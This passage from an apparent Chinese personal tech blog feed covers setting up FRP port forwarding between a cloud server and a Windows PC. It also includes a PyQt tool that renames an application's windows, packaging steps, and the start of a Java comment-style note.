href="#关闭云服务商防火墙" class="headerlink" title="关闭云服务商防火墙"></a>关闭云服务商防火墙</h5><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/RP%20%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20250624104543612.png"></p><hr><h5 id="测试能否联通"><a href="#测试能否联通" class="headerlink" title="测试能否联通"></a>测试能否联通</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 确认 frps 真正启动并监听在 0.0.0.0:7000，有返回结果就行</span><br><span class="hljs-attribute">sudo</span> netstat -tulpn | grep :<span class="hljs-number">7000</span><br><br><br><span class="hljs-comment"># 1. 本机连通性</span><br><span class="hljs-attribute">telnet</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">7000</span><br><br><span class="hljs-comment"># 2. 公网是否可达</span><br><span class="hljs-attribute">telnet</span> <span class="hljs-number">117.72.211.221</span> <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure><hr><h4 id="配置-FRPS-配置文件：frps-toml"><a href="#配置-FRPS-配置文件：frps-toml" class="headerlink" title="配置 FRPS 配置文件：frps.toml"></a>配置 FRPS 配置文件：frps.toml</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 1. 修改 FRPS 配置文件</span><br>vim /mystudy/frp/frp/frps.toml<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-meta"># frps.toml (v0.62.1+ 推荐最简配置)</span><br><br><span class="hljs-meta"># 监听客户端连接的地址与端口</span><br>bindAddr <span class="hljs-punctuation">=</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>bindPort <span class="hljs-punctuation">=</span> <span class="hljs-number">7000</span><br><br><span class="hljs-meta"># 如果要开启 Web Dashboard，则如下配置</span><br><span class="hljs-meta"># Dashboard 会在 127.0.0.1:7500 上提供状态页面</span><br>webServer.addr <span class="hljs-punctuation">=</span> <span class="hljs-string">&quot;127.0.0.0&quot;</span><br>webServer.port <span class="hljs-punctuation">=</span> <span class="hljs-number">7500</span><br>webServer.user <span class="hljs-punctuation">=</span> <span class="hljs-string">&quot;admin&quot;</span><br>webServer.password <span class="hljs-punctuation">=</span> <span class="hljs-string">&quot;admin123&quot;</span><br><br><span class="hljs-meta"># 日志输出到文件，并设定日志级别</span><br><span class="hljs-built_in">log</span>.to <span class="hljs-punctuation">=</span> <span class="hljs-string">&quot;./frps.log&quot;</span><br><span class="hljs-built_in">log</span>.level <span class="hljs-punctuation">=</span> <span class="hljs-string">&quot;info&quot;</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h4 id="启动-FRPS-端-1"><a href="#启动-FRPS-端-1" class="headerlink" title="启动 FRPS 端"></a>启动 FRPS 端</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 进入 FRP 目录</span><br><span class="hljs-built_in">cd</span> /mystudy/frp/frp<br><br><br><span class="hljs-comment"># 2. 启动 FRPS 端</span><br>./frps -c frps.toml<br></code></pre></td></tr></table></figure><hr><h4 id="设置-FRPS-开机自启动"><a href="#设置-FRPS-开机自启动" class="headerlink" title="设置 FRPS 开机自启动"></a>设置 FRPS 开机自启动</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo tee /etc/systemd/system/frps.service &gt; /dev/<span class="hljs-literal">null</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br>[Unit]<br><span class="hljs-attribute">Description</span>=FRP<span class="hljs-built_in"> Server Service</span><br><span class="hljs-built_in"></span><span class="hljs-attribute">After</span>=network.target<br><br>[Service]<br><span class="hljs-attribute">Type</span>=simple<br><span class="hljs-attribute">User</span>=root<br><span class="hljs-comment"># 请改成你的 frps 可执行文件所在绝对路径</span><br><span class="hljs-attribute">ExecStart</span>=/mystudy/frp/frp/frps -c /mystudy/frp/frp/frps.toml<br><span class="hljs-attribute">Restart</span>=on-failure<br><span class="hljs-attribute">RestartSec</span>=5s<br><br><span class="hljs-comment"># 日志输出到 journal</span><br><span class="hljs-attribute">StandardOutput</span>=journal<br><span class="hljs-attribute">StandardError</span>=journal<br><br>[Install]<br><span class="hljs-attribute">WantedBy</span>=multi-user.target<br>EOF<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 让 systemd 识别新服务</span><br><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><br><span class="hljs-comment"># 开机自动启动</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> frps.service<br><br><span class="hljs-comment"># 立刻启动</span><br><span class="hljs-built_in">sudo</span> systemctl start frps.service<br><br><span class="hljs-comment"># 查看服务是否正常运行</span><br><span class="hljs-built_in">sudo</span> systemctl status frps.service<br><br></code></pre></td></tr></table></figure><h2 id="FRPC-端（本地电脑端）"><a href="#FRPC-端（本地电脑端）" class="headerlink" title="FRPC 端（本地电脑端）"></a>FRPC 端（本地电脑端）</h2><h3 id="下载并安装-FRP-Windows"><a href="#下载并安装-FRP-Windows" class="headerlink" title="下载并安装 FRP Windows"></a>下载并安装 FRP Windows</h3><p><span style="background:#fff88f">1. 下载 FRP Windows</span><br>从 <a href="https://github.com/fatedier/frp/releases">FRP 服务端下载地址</a>下载 FRP 服务端安装包：<br><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/RP%20%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20250624102659401.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>下载前请确认服务器架构，AMD64 需下载 windows_amd64，ARM64 需下载 windows_arm64</li></ol></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> $<span class="hljs-keyword">en</span><span class="hljs-variable">v:PROCESSOR_ARCHITECTURE</span><br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">2. 解压 FRP Windows</span></p><hr><h3 id="启动-FRPC-端"><a href="#启动-FRPC-端" class="headerlink" title="启动 FRPC 端"></a>启动 FRPC 端</h3><h4 id="配置-FRPC-配置文件：frpc-toml"><a href="#配置-FRPC-配置文件：frpc-toml" class="headerlink" title="配置 FRPC 配置文件：frpc.toml"></a>配置 FRPC 配置文件：frpc.toml</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 修改 FRPC 配置文件</span><br>编辑 frpc.toml<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[common]</span><br><span class="hljs-string">server_addr = &quot;117.72.211.221&quot;</span><br><span class="hljs-string">server_port = 7000</span><br><span class="hljs-string">[socks5]</span><br><span class="hljs-string">type       = &quot;tcp&quot;</span><br><span class="hljs-string">local_ip   = &quot;127.0.0.1&quot;</span><br><span class="hljs-string">local_port = 7890</span><br><span class="hljs-string">remote_port= 7890</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>你在 <code>local_port</code> 和 <code>remote_port</code> 的 <strong>字段后面直接加了注释</strong>，这虽然在某些宽容的 TOML 解析器中可以工作，但 <code>frp v0.62.1+</code> 使用的是严格模式，<strong>不允许字段后紧跟中文注释或注释前无空格</strong>。<br><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/RP%20%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20250624110113741.png"></p><hr><h4 id="启动-FRPC-端-1"><a href="#启动-FRPC-端-1" class="headerlink" title="启动 FRPC 端"></a>启动 FRPC 端</h4><p>进入命令行（CMD）运行：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\frpc.exe</span> -c frpc.toml<br></code></pre></td></tr></table></figure><hr><h2 id="云服务器"><a href="#云服务器" class="headerlink" title="云服务器"></a>云服务器</h2><p>访问</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo netstat -tulpn | grep :7890<br><br><br>127.0.0.1:7890<br><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;http://127.0.0.1:7890&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-string">&quot;http://127.0.0.1:7890&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">no_proxy</span>=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-variable">$http_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-variable">$https_proxy</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">NO_PROXY</span>=<span class="hljs-variable">$no_proxy</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>内网穿透</category>
      
      <category>FRP 内网穿透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Tomcat</title>
    <link href="/2025/06/22/%E7%AC%94%E8%AE%B0%EF%BC%9ATomcat%20%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2025/06/22/%E7%AC%94%E8%AE%B0%EF%BC%9ATomcat%20%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>服务器</category>
      
      <category>Tomcat 服务器</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：修改窗口小工具</title>
    <link href="/2025/06/22/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BF%AE%E6%94%B9%E7%AA%97%E5%8F%A3%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/06/22/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BF%AE%E6%94%B9%E7%AA%97%E5%8F%A3%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Py-代码"><a href="#1-Py-代码" class="headerlink" title="1. Py 代码"></a>1. Py 代码</h2><p>创建 <code>修改窗口小工具.py</code> 并编写代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> psutil<br><span class="hljs-keyword">import</span> win32gui<br><span class="hljs-keyword">import</span> win32process<br><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton, QTextEdit, QFileDialog<br><span class="hljs-keyword">from</span> PyQt5.QtCore <span class="hljs-keyword">import</span> Qt<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowTitleModifier</span>(<span class="hljs-title class_ inherited__">QMainWindow</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-variable language_">self</span>.initUI()<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">initUI</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.setWindowTitle(<span class="hljs-string">&quot;修改窗口小工具&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.setGeometry(<span class="hljs-number">300</span>, <span class="hljs-number">300</span>, <span class="hljs-number">600</span>, <span class="hljs-number">400</span>)<br>        <br>        <span class="hljs-comment"># 主布局</span><br>        central_widget = QWidget()<br>        <span class="hljs-variable language_">self</span>.setCentralWidget(central_widget)<br>        layout = QVBoxLayout(central_widget)<br>        <br>        <span class="hljs-comment"># 输入布局</span><br>        input_layout = QHBoxLayout()<br>        <span class="hljs-variable language_">self</span>.exe_label = QLabel(<span class="hljs-string">&quot;EXE文件：&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.exe_input = QLineEdit()<br>        <span class="hljs-variable language_">self</span>.exe_input.setReadOnly(<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 设置为只读</span><br>        <span class="hljs-variable language_">self</span>.exe_input.setPlaceholderText(<span class="hljs-string">&quot;点击浏览选择EXE文件&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.browse_button = QPushButton(<span class="hljs-string">&quot;浏览&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.browse_button.clicked.connect(<span class="hljs-variable language_">self</span>.browse_exe)<br>        <span class="hljs-variable language_">self</span>.find_button = QPushButton(<span class="hljs-string">&quot;查找窗口&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.find_button.clicked.connect(<span class="hljs-variable language_">self</span>.find_windows)<br>        input_layout.addWidget(<span class="hljs-variable language_">self</span>.exe_label)<br>        input_layout.addWidget(<span class="hljs-variable language_">self</span>.exe_input)<br>        input_layout.addWidget(<span class="hljs-variable language_">self</span>.browse_button)<br>        input_layout.addWidget(<span class="hljs-variable language_">self</span>.find_button)<br>        layout.addLayout(input_layout)<br>        <br>        <span class="hljs-comment"># 新标题前缀输入</span><br>        prefix_layout = QHBoxLayout()<br>        <span class="hljs-variable language_">self</span>.prefix_label = QLabel(<span class="hljs-string">&quot;新标题前缀（如 奶块）：&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.prefix_input = QLineEdit()<br>        <span class="hljs-variable language_">self</span>.prefix_input.setPlaceholderText(<span class="hljs-string">&quot;输入新标题前缀&quot;</span>)<br>        prefix_layout.addWidget(<span class="hljs-variable language_">self</span>.prefix_label)<br>        prefix_layout.addWidget(<span class="hljs-variable language_">self</span>.prefix_input)<br>        layout.addLayout(prefix_layout)<br>        <br>        <span class="hljs-comment"># 输出窗口列表</span><br>        <span class="hljs-variable language_">self</span>.output_text = QTextEdit()<br>        <span class="hljs-variable language_">self</span>.output_text.setReadOnly(<span class="hljs-literal">True</span>)<br>        layout.addWidget(<span class="hljs-variable language_">self</span>.output_text)<br>        <br>        <span class="hljs-comment"># 修改按钮</span><br>        <span class="hljs-variable language_">self</span>.modify_button = QPushButton(<span class="hljs-string">&quot;一键修改标题&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.modify_button.clicked.connect(<span class="hljs-variable language_">self</span>.modify_titles)<br>        layout.addWidget(<span class="hljs-variable language_">self</span>.modify_button)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">browse_exe</span>(<span class="hljs-params">self</span>):<br>        file_name, _ = QFileDialog.getOpenFileName(<span class="hljs-variable language_">self</span>, <span class="hljs-string">&quot;选择EXE文件&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;可执行文件 (*.exe)&quot;</span>)<br>        <span class="hljs-keyword">if</span> file_name:<br>            <span class="hljs-variable language_">self</span>.exe_input.setText(file_name)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_windows_by_exe</span>(<span class="hljs-params">self, exe_path</span>):<br>        windows = []<br>        exe_name = os.path.basename(exe_path).lower()<br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">enum_windows_callback</span>(<span class="hljs-params">hwnd, results</span>):<br>            _, pid = win32process.GetWindowThreadProcessId(hwnd)<br>            <span class="hljs-keyword">try</span>:<br>                process = psutil.Process(pid)<br>                <span class="hljs-keyword">if</span> os.path.basename(process.exe()).lower() == exe_name <span class="hljs-keyword">and</span> win32gui.IsWindowVisible(hwnd):<br>                    title = win32gui.GetWindowText(hwnd)<br>                    <span class="hljs-keyword">if</span> title:  <span class="hljs-comment"># 只添加有标题的窗口</span><br>                        results.append((hwnd, title))<br>            <span class="hljs-keyword">except</span> (psutil.NoSuchProcess, psutil.AccessDenied):<br>                <span class="hljs-keyword">pass</span><br>        <br>        win32gui.EnumWindows(enum_windows_callback, windows)<br>        <span class="hljs-keyword">return</span> windows<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_windows</span>(<span class="hljs-params">self</span>):<br>        exe_path = <span class="hljs-variable language_">self</span>.exe_input.text().strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exe_path:<br>            <span class="hljs-variable language_">self</span>.output_text.setText(<span class="hljs-string">&quot;请先选择EXE文件！&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <br>        windows = <span class="hljs-variable language_">self</span>.get_windows_by_exe(exe_path)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> windows:<br>            <span class="hljs-variable language_">self</span>.output_text.setText(<span class="hljs-string">f&quot;未找到由 <span class="hljs-subst">&#123;os.path.basename(exe_path)&#125;</span> 打开的窗口！&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <br>        output = <span class="hljs-string">f&quot;找到 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(windows)&#125;</span> 个窗口：\n&quot;</span><br>        <span class="hljs-keyword">for</span> i, (hwnd, title) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(windows, <span class="hljs-number">1</span>):<br>            output += <span class="hljs-string">f&quot;窗口 <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;title&#125;</span>\n&quot;</span><br>        <br>        <span class="hljs-variable language_">self</span>.output_text.setText(output)<br>        <span class="hljs-variable language_">self</span>.windows = windows  <span class="hljs-comment"># 保存窗口列表</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">modify_titles</span>(<span class="hljs-params">self</span>):<br>        prefix = <span class="hljs-variable language_">self</span>.prefix_input.text().strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> prefix:<br>            <span class="hljs-variable language_">self</span>.output_text.append(<span class="hljs-string">&quot;\n请输入新标题前缀！&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(<span class="hljs-variable language_">self</span>, <span class="hljs-string">&#x27;windows&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.windows:<br>            <span class="hljs-variable language_">self</span>.output_text.append(<span class="hljs-string">&quot;\n请先查找窗口！&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <br>        output = <span class="hljs-string">&quot;\n修改结果：\n&quot;</span><br>        <span class="hljs-keyword">for</span> i, (hwnd, old_title) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-variable language_">self</span>.windows, <span class="hljs-number">1</span>):<br>            new_title = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;prefix&#125;</span><span class="hljs-subst">&#123;i:02d&#125;</span>&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                win32gui.SetWindowText(hwnd, new_title)<br>                output += <span class="hljs-string">f&quot;窗口 <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;old_title&#125;</span> -&gt; <span class="hljs-subst">&#123;new_title&#125;</span>\n&quot;</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                output += <span class="hljs-string">f&quot;窗口 <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;old_title&#125;</span> 修改失败！错误：<span class="hljs-subst">&#123;e&#125;</span>\n&quot;</span><br>        <br>        <span class="hljs-variable language_">self</span>.output_text.append(output)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app = QApplication(sys.argv)<br>    window = WindowTitleModifier()<br>    window.show()<br>    sys.exit(app.exec_())<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>安装 psutil、pywin32 依赖：</li></ol></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pip install psutil -<span class="hljs-selector-tag">i</span> https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br><br>pip install pywin32 -<span class="hljs-selector-tag">i</span> https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-打包为-exe"><a href="#2-打包为-exe" class="headerlink" title="2. 打包为 exe"></a>2. 打包为 exe</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 安装打包工具</span><br>pip install pyinstaller<br><br><br><span class="hljs-comment"># 2. 打包代码</span><br>pyinstaller <span class="hljs-operator">-</span>-onefile <span class="hljs-operator">-</span>-windowed <span class="hljs-operator">-</span>-icon<span class="hljs-operator">=</span><span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\I</span>CO<span class="hljs-char escape_">\修</span>改窗口小工具.ico&quot;</span> <span class="hljs-operator">-</span>-distpath <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合&quot;</span> <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\修</span>改窗口小工具.py&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. --onefile</span><br><span class="hljs-string">1. 打包为单个 .exe 文件。</span><br><span class="hljs-string">2. --windowed</span><br><span class="hljs-string">1. 确保 GUI 程序无控制台窗口</span><br><span class="hljs-string">3. --distpath &quot;</span>D:\文件集合\<span class="hljs-string">&quot;  &quot;</span>D:\文件集合\本地图库.py<span class="hljs-string">&quot;</span><br><span class="hljs-string">1. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\ </span>是输出位置</span><br><span class="hljs-string">2. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\本</span>地图库.py 是输入位置</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>自研小工具</category>
      
      <category>修改窗口小工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：阿里云代码规约</title>
    <link href="/2025/06/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E9%98%BF%E9%87%8C%E4%BA%91%E4%BB%A3%E7%A0%81%E8%A7%84%E7%BA%A6/"/>
    <url>/2025/06/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E9%98%BF%E9%87%8C%E4%BA%91%E4%BB%A3%E7%A0%81%E8%A7%84%E7%BA%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="常见美观的-Java-注释"><a href="#常见美观的-Java-注释" class="headerlink" title="常见美观的 Java 注释"></a>常见美观的 Java 注释</h2><h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><p><span style="background:#fff88f">1. 样式一</span></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs abnf">/**<br> * <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span 